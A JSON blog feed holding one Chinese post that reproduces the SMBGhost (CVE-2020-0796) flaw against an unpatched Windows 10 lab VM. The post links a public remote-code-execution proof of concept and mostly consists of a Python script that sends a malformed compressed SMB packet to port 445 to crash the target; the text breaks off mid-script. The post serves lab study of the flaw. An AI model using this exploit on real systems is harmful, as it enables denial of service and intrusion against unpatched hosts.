{
    "version": "https://jsonfeed.org/version/1",
    "title": "Blog • All posts by \"渗透\" tag",
    "description": "",
    "home_page_url": "https://vvwwvv.cn",
    "items": [
        {
            "id": "https://vvwwvv.cn/2023/09/28/windows/Windows10%E4%B9%8B%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/",
            "url": "https://vvwwvv.cn/2023/09/28/windows/Windows10%E4%B9%8B%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/",
            "title": "Windows10永恒之黑漏洞复现（CVE-2020-0796）",
            "date_published": "2023-09-28T09:39:56.000Z",
            "content_html": "<h1 id=\"渗透攻击win10永恒之黑漏洞-cve-2020-0796\"><a class=\"anchor\" href=\"#渗透攻击win10永恒之黑漏洞-cve-2020-0796\">#</a> 渗透攻击 win10（永恒之黑漏洞 CVE-2020-0796）</h1>\n<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<p>永恒之黑漏洞是源于 <code>SMB 3.1.1</code>  协议中压缩数据时没有对数据进行安全检查，引起了内存破坏漏洞，导致可以被攻击者利用从而远程执行任意代码。</p>\n<p>这次利用的是 window10，它的漏洞源于 <code>SMBv3</code>  没有准确处理压缩包，在解压时没有检查客户端传过来的长度是否合法，导致 <code>整数溢出</code> ，利用该漏洞，黑客可直接远程攻击 SMB 服务端远程执行任意恶意代码</p>\n<h2 id=\"环境\"><a class=\"anchor\" href=\"#环境\">#</a> 环境</h2>\n<p>kali ip：192.168.232.129</p>\n<pre><code>Distributor ID: Kali\nDescription:    Kali GNU/Linux Rolling\nRelease:        2023.3\nCodename:       kali-rolling\n</code></pre>\n<p>Windows 10 (consumer editions), version 1909 (x64)  ip：192.168.232.132</p>\n<h2 id=\"工具\"><a class=\"anchor\" href=\"#工具\">#</a> 工具</h2>\n<ol>\n<li><code>msfvenom</code>  来生成 <code>shellcode</code></li>\n<li>利用别人已有的 poc：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2Nob21waWUxMzM3L1NNQkdob3N0X1JDRV9Qb0MuZ2l0\">https://github.com/chompie1337/SMBGhost_RCE_PoC.git</span></li>\n</ol>\n<h2 id=\"检测是否打了补丁\"><a class=\"anchor\" href=\"#检测是否打了补丁\">#</a> 检测是否打了补丁</h2>\n<p>该漏洞于 <code>KB4551762补丁</code> 修复</p>\n<p>利用命令 <code>systeminfo</code>  查看情况<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/28/pPb2Smt.png\" alt=\"\" /></p>\n<p>并没有补丁进行修复，可以利用漏洞</p>\n<h2 id=\"永恒之黑漏洞复现cev-2020-0796\"><a class=\"anchor\" href=\"#永恒之黑漏洞复现cev-2020-0796\">#</a> 永恒之黑漏洞复现（CEV-2020-0796）</h2>\n<p>1. 安装 win10 关闭防火墙并查看 ip<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/28/pPbcNvR.png\" alt=\"\" /></p>\n<p>2. 检测是否能够 <code>ping</code>  通<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/28/pPbgXSH.png\" alt=\"\" /></p>\n<h3 id=\"3在kali中利用python脚本测试漏洞成功时win10主机会蓝屏\"><a class=\"anchor\" href=\"#3在kali中利用python脚本测试漏洞成功时win10主机会蓝屏\">#</a> 3. 在 kali 中利用 python 脚本测试漏洞，成功时 win10 主机会蓝屏</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> socket<span class=\"token punctuation\">,</span> struct<span class=\"token punctuation\">,</span> sys</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> netaddr <span class=\"token keyword\">import</span> IPNetwork</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Smb2Header</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> command<span class=\"token punctuation\">,</span> message_id<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        self<span class=\"token punctuation\">.</span>protocol_id <span class=\"token operator\">=</span> <span class=\"token string\">\"\\xfeSMB\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        self<span class=\"token punctuation\">.</span>structure_size <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x40\\x00\"</span>  <span class=\"token comment\"># Must be set to 0x40</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        self<span class=\"token punctuation\">.</span>credit_charge <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x00\"</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        self<span class=\"token punctuation\">.</span>channel_sequence <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x00\"</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        self<span class=\"token punctuation\">.</span>channel_reserved <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x00\"</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        self<span class=\"token punctuation\">.</span>command <span class=\"token operator\">=</span> command</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        self<span class=\"token punctuation\">.</span>credits_requested <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x00\"</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span>  <span class=\"token comment\"># Number of credits requested / granted</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        self<span class=\"token punctuation\">.</span>flags <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x00\"</span> <span class=\"token operator\">*</span> <span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        self<span class=\"token punctuation\">.</span>chain_offset <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x00\"</span> <span class=\"token operator\">*</span> <span class=\"token number\">4</span>  <span class=\"token comment\"># Points to next message</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        self<span class=\"token punctuation\">.</span>message_id <span class=\"token operator\">=</span> message_id</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        self<span class=\"token punctuation\">.</span>reserved <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x00\"</span> <span class=\"token operator\">*</span> <span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        self<span class=\"token punctuation\">.</span>tree_id <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x00\"</span> <span class=\"token operator\">*</span> <span class=\"token number\">4</span>  <span class=\"token comment\"># Changes for some commands</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        self<span class=\"token punctuation\">.</span>session_id <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x00\"</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        self<span class=\"token punctuation\">.</span>signature <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x00\"</span> <span class=\"token operator\">*</span> <span class=\"token number\">16</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">get_packet</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">return</span> self<span class=\"token punctuation\">.</span>protocol_id <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>structure_size <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>credit_charge <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>channel_sequence <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>channel_reserved <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>command <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>credits_requested <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>flags <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>chain_offset <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>message_id <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>reserved <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>tree_id <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>session_id <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>signature</pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Smb2NegotiateRequest</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        self<span class=\"token punctuation\">.</span>header <span class=\"token operator\">=</span> Smb2Header<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\x00\"</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\x00\"</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        self<span class=\"token punctuation\">.</span>structure_size <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x24\\x00\"</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        self<span class=\"token punctuation\">.</span>dialect_count <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x08\\x00\"</span>  <span class=\"token comment\"># 8 dialects</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        self<span class=\"token punctuation\">.</span>security_mode <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x00\"</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        self<span class=\"token punctuation\">.</span>reserved <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x00\"</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        self<span class=\"token punctuation\">.</span>capabilities <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x7f\\x00\\x00\\x00\"</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        self<span class=\"token punctuation\">.</span>guid <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x01\\x02\\xab\\xcd\"</span> <span class=\"token operator\">*</span> <span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        self<span class=\"token punctuation\">.</span>negotiate_context <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x78\\x00\"</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        self<span class=\"token punctuation\">.</span>additional_padding <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x00\"</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        self<span class=\"token punctuation\">.</span>negotiate_context_count <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x02\\x00\"</span>  <span class=\"token comment\"># 2 Contexts</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        self<span class=\"token punctuation\">.</span>reserved_2 <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x00\"</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        self<span class=\"token punctuation\">.</span>dialects <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x02\\x02\"</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"\\x10\\x02\"</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"\\x22\\x02\"</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"\\x24\\x02\"</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"\\x00\\x03\"</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"\\x02\\x03\"</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"\\x10\\x03\"</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"\\x11\\x03\"</span>  <span class=\"token comment\"># SMB 2.0.2, 2.1, 2.2.2, 2.2.3, 3.0, 3.0.2, 3.1.0, 3.1.1</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        self<span class=\"token punctuation\">.</span>padding <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x00\"</span> <span class=\"token operator\">*</span> <span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">context</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">,</span> length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        data_length <span class=\"token operator\">=</span> length</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        reserved <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x00\"</span> <span class=\"token operator\">*</span> <span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token builtin\">type</span> <span class=\"token operator\">+</span> data_length <span class=\"token operator\">+</span> reserved</pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">preauth_context</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        hash_algorithm_count <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x01\\x00\"</span>  <span class=\"token comment\"># 1 hash algorithm</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        salt_length <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x20\\x00\"</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        hash_algorithm <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x01\\x00\"</span>  <span class=\"token comment\"># SHA512</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        salt <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x00\"</span> <span class=\"token operator\">*</span> <span class=\"token number\">32</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        pad <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x00\"</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        length <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x26\\x00\"</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        context_header <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>context<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\x01\\x00\"</span><span class=\"token punctuation\">,</span> length<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        <span class=\"token keyword\">return</span> context_header <span class=\"token operator\">+</span> hash_algorithm_count <span class=\"token operator\">+</span> salt_length <span class=\"token operator\">+</span> hash_algorithm <span class=\"token operator\">+</span> salt <span class=\"token operator\">+</span> pad</pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">compression_context</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        compression_algorithm_count <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x03\\x00\"</span>  <span class=\"token comment\"># 3 Compression algorithms</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        padding <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x00\"</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        flags <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x01\\x00\\x00\\x00\"</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        algorithms <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x01\\x00\"</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"\\x02\\x00\"</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"\\x03\\x00\"</span>  <span class=\"token comment\"># LZNT1 + LZ77 + LZ77+Huffman</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        length <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x0e\\x00\"</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        context_header <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>context<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\x03\\x00\"</span><span class=\"token punctuation\">,</span> length<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>        <span class=\"token keyword\">return</span> context_header <span class=\"token operator\">+</span> compression_algorithm_count <span class=\"token operator\">+</span> padding <span class=\"token operator\">+</span> flags <span class=\"token operator\">+</span> algorithms</pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">get_packet</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>        padding <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x00\"</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>        <span class=\"token keyword\">return</span> self<span class=\"token punctuation\">.</span>header<span class=\"token punctuation\">.</span>get_packet<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>structure_size <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>dialect_count <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>security_mode <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>reserved <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>capabilities <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>guid <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>negotiate_context <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>additional_padding <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>negotiate_context_count <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>reserved_2 <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>dialects <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>padding <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>preauth_context<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>compression_context<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> padding</pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">NetBIOSWrapper</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>        self<span class=\"token punctuation\">.</span>session <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x00\"</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>        self<span class=\"token punctuation\">.</span>length <span class=\"token operator\">=</span> struct<span class=\"token punctuation\">.</span>pack<span class=\"token punctuation\">(</span><span class=\"token string\">'>i'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'latin1'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>        self<span class=\"token punctuation\">.</span>data <span class=\"token operator\">=</span> data</pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">get_packet</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>        <span class=\"token keyword\">return</span> self<span class=\"token punctuation\">.</span>session <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>length <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>data</pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Smb2CompressedTransformHeader</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>        self<span class=\"token punctuation\">.</span>data <span class=\"token operator\">=</span> data</pre></td></tr><tr><td data-num=\"70\"></td><td><pre>        self<span class=\"token punctuation\">.</span>protocol_id <span class=\"token operator\">=</span> <span class=\"token string\">\"\\xfcSMB\"</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>        self<span class=\"token punctuation\">.</span>original_decompressed_size <span class=\"token operator\">=</span> struct<span class=\"token punctuation\">.</span>pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;i'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'latin1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>        self<span class=\"token punctuation\">.</span>compression_algorithm <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x01\\x00\"</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>        self<span class=\"token punctuation\">.</span>flags <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x00\"</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>        self<span class=\"token punctuation\">.</span>offset <span class=\"token operator\">=</span> <span class=\"token string\">\"\\xff\\xff\\xff\\xff\"</span>  <span class=\"token comment\"># Exploit the vulnerability</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">get_packet</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>        <span class=\"token keyword\">return</span> self<span class=\"token punctuation\">.</span>protocol_id <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>original_decompressed_size <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>compression_algorithm <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>flags <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>offset <span class=\"token operator\">+</span> self<span class=\"token punctuation\">.</span>data</pre></td></tr><tr><td data-num=\"77\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">send_negotiation</span><span class=\"token punctuation\">(</span>sock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>    negotiate <span class=\"token operator\">=</span> Smb2NegotiateRequest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>    packet <span class=\"token operator\">=</span> NetBIOSWrapper<span class=\"token punctuation\">(</span>negotiate<span class=\"token punctuation\">.</span>get_packet<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>get_packet<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>    sock<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>packet<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'latin1'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>    sock<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">3000</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">send_compressed</span><span class=\"token punctuation\">(</span>sock<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>    compressed <span class=\"token operator\">=</span> Smb2CompressedTransformHeader<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>    packet <span class=\"token operator\">=</span> NetBIOSWrapper<span class=\"token punctuation\">(</span>compressed<span class=\"token punctuation\">.</span>get_packet<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>get_packet<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>    sock<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>packet<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'latin1'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>    sock<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">1000</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">darkness_attack</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">:</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>    sock <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">.</span>socket<span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>AF_INET<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>    sock<span class=\"token punctuation\">.</span>settimeout<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>    sock<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">,</span> <span class=\"token number\">445</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>    send_negotiation<span class=\"token punctuation\">(</span>sock<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>        send_compressed<span class=\"token punctuation\">(</span>sock<span class=\"token punctuation\">,</span> <span class=\"token string\">\"JST\"</span> <span class=\"token operator\">*</span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>    <span class=\"token keyword\">except</span> Exception<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">scanner</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>    pkt <span class=\"token operator\">=</span> <span class=\"token 